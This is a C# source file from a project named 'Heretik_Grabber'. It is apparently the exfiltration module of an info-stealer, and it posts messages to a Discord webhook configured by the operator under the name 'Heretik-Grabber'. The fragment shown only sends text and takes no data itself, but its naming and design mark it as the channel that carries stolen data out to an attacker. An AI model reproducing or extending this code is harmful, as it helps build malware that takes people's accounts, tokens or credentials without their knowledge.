using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.Security.Principal;

namespace Heretik_Grabber
{
    class discordWebhook
    {
        public static void sendText(string msg)
        {
            Http.Post(config.discordWebhookURL, new NameValueCollection()
            {
                { "username", "Heretik-Grabber" },
                { "avatar_url", "https://cdn.discordapp.com/avatars/640111118513340416/e3598a4dfd491f1d1a58919714c8f95f.webp?size=256" },
                { "content", $"```{msg}```" }
            });
        }
    }
    class Http
    {
        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(uri, pairs);
        }
    }
}
